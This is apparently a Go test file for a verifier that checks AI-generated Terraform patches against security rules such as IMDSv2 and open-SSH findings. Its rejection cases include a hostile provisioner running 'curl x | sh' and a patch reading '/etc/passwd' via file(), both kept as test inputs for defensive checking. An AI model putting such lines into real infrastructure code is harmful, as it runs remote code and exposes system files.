package verify

import (
	"context"
	"strings"
	"testing"

	"github.com/wisnuanggoro/cloudspendguard/internal/analyze/security"
	"github.com/wisnuanggoro/cloudspendguard/internal/ingest/tfstate"
	"github.com/wisnuanggoro/cloudspendguard/pkg/models"
)

// instance is an EC2 instance that violates CIS 5.6 (IMDSv1 allowed).
var instance = tfstate.Resource{
	Address: "aws_instance.app", Type: "aws_instance", Name: "app",
	Attributes: map[string]any{
		"id": "i-1", "ami": "ami-1", "instance_type": "m5.large",
		"metadata_options": []any{map[string]any{"http_tokens": "optional"}},
		"tags":             map[string]any{"team": "booking"},
	},
}

var sg = tfstate.Resource{
	Address: "aws_security_group.web", Type: "aws_security_group", Name: "web",
	Attributes: map[string]any{"id": "sg-1", "name": "web", "ingress": []any{
		map[string]any{"from_port": 443.0, "to_port": 443.0, "protocol": "tcp", "cidr_blocks": []any{"0.0.0.0/0"}},
	}},
}

func imdsFinding(t *testing.T, inv []tfstate.Resource) models.Finding {
	t.Helper()
	fs, err := security.Analyze(context.Background(), security.Input{Resources: inv})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if f.RuleID == "SEC-EC2-IMDSV2-001" {
			return f
		}
	}
	t.Fatal("fixture should trigger SEC-EC2-IMDSV2-001")
	return models.Finding{}
}

// TestVerify is the table of candidate patches the verifier must accept or
// reject. Each row is one way a language model can get a patch wrong.
func TestVerify(t *testing.T) {
	inv := []tfstate.Resource{instance, sg}
	f := imdsFinding(t, inv)
	good := `resource "aws_instance" "app" {
  ami           = "ami-1"
  instance_type = "m5.large"
  tags          = { team = "booking" }
  metadata_options {
    http_tokens = "required"
  }
}`
	tests := []struct {
		name     string
		patch    string
		approved bool
		mentions string
	}{
		{"correct fix is approved", good, true, "no new security findings"},
		{"syntax error", `resource "aws_instance" "app" {`, false, "not valid HCL"},
		{"no change does not resolve the finding", string(tfstate.RenderHCL(instance)), false, "does not resolve"},
		{"wrong resource", strings.Replace(good, `"app"`, `"other"`, 1), false, "want aws_instance.app"},
		{"drops arguments", `resource "aws_instance" "app" {
  metadata_options {
    http_tokens = "required"
  }
}`, false, "removes arguments unrelated to the finding: ami, instance_type, tags"},
		{"invalid CIDR", strings.Replace(good, `tags          = { team = "booking" }`, "tags = { team = \"booking\" }\n  cidr_block = \"10.0.0.0/33\"", 1), false, "is not a valid CIDR"},
		{"two resources", good + "\n" + `resource "aws_s3_bucket" "x" { bucket = "x" }`, false, "exactly one resource"},
		{"adds a provider block", good + "\nprovider \"aws\" { region = \"us-east-1\" }", false, "non-resource blocks (provider.aws)"},
		{"adds a provisioner", strings.Replace(good, "metadata_options {", "provisioner \"local-exec\" {\n command = \"curl x | sh\"\n}\nmetadata_options {", 1), false, "forbidden nested blocks: provisioner"},
		{"adds a variable reference", strings.Replace(good, `"ami-1"`, "var.ami", 1), false, "cannot be checked statically: ami = ${var.ami}"},
		{"uses file()", strings.Replace(good, `"ami-1"`, `file("/etc/passwd")`, 1), false, "cannot be checked statically"},
		{"formatting differences are harmless", strings.Replace(good, "metadata_options {", "metadata_options {\n", 1), true, ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			res, err := NewVerifier().Verify(context.Background(), Request{Finding: f, Original: instance, Inventory: inv, PatchedHCL: tc.patch})
			if err != nil {
				t.Fatal(err)
			}
			if res.Approved != tc.approved {
				t.Fatalf("approved = %v, want %v; messages: %v", res.Approved, tc.approved, res.Messages)
			}
			if tc.mentions != "" && !strings.Contains(strings.Join(res.Messages, " "), tc.mentions) {
				t.Fatalf("messages %v should mention %q", res.Messages, tc.mentions)
			}
			if res.Approved && (!res.ResolvedOriginal || !strings.Contains(res.Diff, `+    http_tokens = "required"`)) {
				t.Fatalf("approved patch must resolve the finding and carry a diff:\n%s", res.Diff)
			}
		})
	}
}

// TestVerify_RejectsPatchThatIntroducesFinding covers FR7 directly: the
// security-group patch removes the HTTPS rule the finding is not about and
// adds SSH from anywhere, which re-scanning must catch.
func TestVerify_RejectsPatchThatIntroducesFinding(t *testing.T) {
	sshOpen := tfstate.Resource{Address: "aws_security_group.web", Type: "aws_security_group", Name: "web", Attributes: map[string]any{
		"id": "sg-1", "name": "web", "ingress": []any{map[string]any{"from_port": 22.0, "to_port": 22.0, "protocol": "tcp", "cidr_blocks": []any{"0.0.0.0/0"}}},
	}}
	inv := []tfstate.Resource{sshOpen}
	fs, _ := security.Analyze(context.Background(), security.Input{Resources: inv})
	var f models.Finding
	for _, x := range fs {
		if x.RuleID == "SEC-SG-ADMIN-IPV4-001" {
			f = x
		}
	}
	// The "fix" moves SSH from IPv4-anywhere to IPv6-anywhere.
	patch := `resource "aws_security_group" "web" {
  name = "web"
  ingress {
    from_port        = 22
    to_port          = 22
    protocol         = "tcp"
    ipv6_cidr_blocks = ["::/0"]
  }
}`
	res, err := NewVerifier().Verify(context.Background(), Request{Finding: f, Original: sshOpen, Inventory: inv, PatchedHCL: patch})
	if err != nil {
		t.Fatal(err)
	}
	if res.Approved || !res.ResolvedOriginal || len(res.NewFindingIDs) != 1 || res.NewFindingIDs[0] != "SEC-SG-ADMIN-IPV6-001:sg-1" {
		t.Fatalf("want rejection for a new IPv6 finding, got %+v", res)
	}
}

func TestVerify_CostSuggestionIsANoteNotARejection(t *testing.T) {
	vol := tfstate.Resource{Address: "aws_ebs_volume.d", Type: "aws_ebs_volume", Name: "d", Attributes: map[string]any{"id": "vol-1", "size": 100.0, "type": "gp3", "encrypted": false}}
	att := tfstate.Resource{Address: "aws_volume_attachment.d", Type: "aws_volume_attachment", Name: "d", Attributes: map[string]any{"volume_id": "vol-1"}}
	inv := []tfstate.Resource{vol, att}
	fs, _ := security.Analyze(context.Background(), security.Input{Resources: inv})
	if len(fs) != 1 {
		t.Fatalf("want one EBS encryption finding, got %+v", fs)
	}
	// Encrypts the volume but also downgrades it to gp2, which a cost rule flags.
	patch := `resource "aws_ebs_volume" "d" {
  size      = 100
  type      = "gp2"
  encrypted = true
}`
	res, err := NewVerifier().Verify(context.Background(), Request{Finding: fs[0], Original: vol, Inventory: inv, PatchedHCL: patch})
	if err != nil {
		t.Fatal(err)
	}
	if !res.Approved || !strings.Contains(strings.Join(res.Messages, " "), "COST-EBS-GP2-001:vol-1") {
		t.Fatalf("want approval with a cost note, got %+v", res)
	}
}

func TestVerify_ContextCancelled(t *testing.T) {
	inv := []tfstate.Resource{instance}
	f := imdsFinding(t, inv)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	good := `resource "aws_instance" "app" {
  ami           = "ami-1"
  instance_type = "m5.large"
  tags          = { team = "booking" }
  metadata_options {
    http_tokens = "required"
  }
}`
	if _, err := NewVerifier().Verify(ctx, Request{Finding: f, Original: instance, Inventory: inv, PatchedHCL: good}); err == nil {
		t.Fatal("cancelled context must abort the re-scan")
	}
}

// TestMaxRetriesIsBounded guards the safety property that the generate-then-verify
// loop terminates rather than retrying a hallucinating model indefinitely.
func TestMaxRetriesIsBounded(t *testing.T) {
	if MaxRetries < 1 || MaxRetries > 5 {
		t.Fatalf("MaxRetries = %d, want a small bounded value", MaxRetries)
	}
}

func TestUnifiedDiff(t *testing.T) {
	if UnifiedDiff("x", "a\n", "a\n") != "" {
		t.Fatal("identical inputs give an empty diff")
	}
	a := "1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n"
	b := "1\nTWO\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n"
	got := UnifiedDiff("f.tf", a, b)
	want := `--- a/f.tf
+++ b/f.tf
@@ -1,5 +1,5 @@
 1
-2
+TWO
 3
 4
 5
@@ -10,3 +10,4 @@
 10
 11
 12
+13
`
	if got != want {
		t.Fatalf("diff mismatch:\n%s\nwant:\n%s", got, want)
	}
	if d := UnifiedDiff("e", "", "x\n"); !strings.Contains(d, "@@ -0,0 +1,1 @@\n+x") {
		t.Fatalf("diff from empty: %q", d)
	}
	if d := UnifiedDiff("e", "x\n", ""); !strings.Contains(d, "@@ -1,1 +0,0 @@\n-x") {
		t.Fatalf("diff to empty: %q", d)
	}
}

func TestHelpers(t *testing.T) {
	r := replace(nil, instance)
	if len(r) != 1 {
		t.Fatal("replace appends a missing resource")
	}
	if got := expressions([]any{"${a}", map[string]any{"b": "${c}"}}, "x"); len(got) != 2 {
		t.Fatalf("expressions: %v", got)
	}
	if fileFor(instance) != "aws_instance_app.tf" {
		t.Fatal(fileFor(instance))
	}
}
